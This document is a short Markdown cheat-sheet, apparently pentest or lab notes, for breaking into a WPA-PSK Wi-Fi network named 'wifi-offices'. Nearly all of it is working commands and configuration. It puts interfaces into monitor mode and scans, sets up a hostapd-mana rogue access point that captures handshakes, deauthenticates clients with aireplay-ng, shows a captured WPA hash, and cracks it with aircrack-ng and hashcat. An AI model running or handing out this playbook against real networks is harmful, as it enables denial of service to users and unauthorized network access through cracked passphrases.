### Setup 

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Identify the network by launching an airodump scan:
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --wps
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```
>[!info]
>(not associated BSSID) is interesting
>Check used encryption & cipher for impersonation


### Creating a Rogue AP

Since a BSSID or Channel can't seem to be found on this ESSID a Rogue Access Point attack can be performed:
```bash
sudo apt install hostapd-mana
```

Create the configuration file, make sure the ESSID is set to wifi-offices:
```bash
interface=wlan1
ssid=<ESSID>
# Pick the channel of the actual AP
channel=1
# for 5 GHz: hw_mode=a
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
# Passphrase can be anything
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/tmp/output.hccapx
```

The AP can now be launched:
```bash
sudo hostapd-mana mana.conf
```


### Deauthenticate client

Deauthenticate client:
```bash
iwconfig wlan0mon channel <channel>
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC> wlan0mon
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
```
>[!info]
>Sometimes only deauthenticating once is better: `-0 1`

Save the hash to a file:
```bash
cat hash
WPA*02*37a5ec3e8ddb4369ea55f3672b62166a*020000000100*b499ba6ff945*776966692d6f666669636573*9751e8d42da63bd0df653964ce36e85100172dea6de0a87c4cc2f49676844cdc*0103007502010a00000000000000000003b8734469d300ce33c2d482e65298ed093c83448dfa970fa43e62fd4237b23362000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*00
```


### Crack the hash

Crack the hash using aircrack-ng
```bash
aircrack-ng output.hccapx -w /usr/share/john/password.lst
```

Crack the hash using hashcat:
```bash
hashcat -m 22000 hash /usr/share/john/password.lst --force
hashcat -m 22000 hash rockyou.txt --force
```
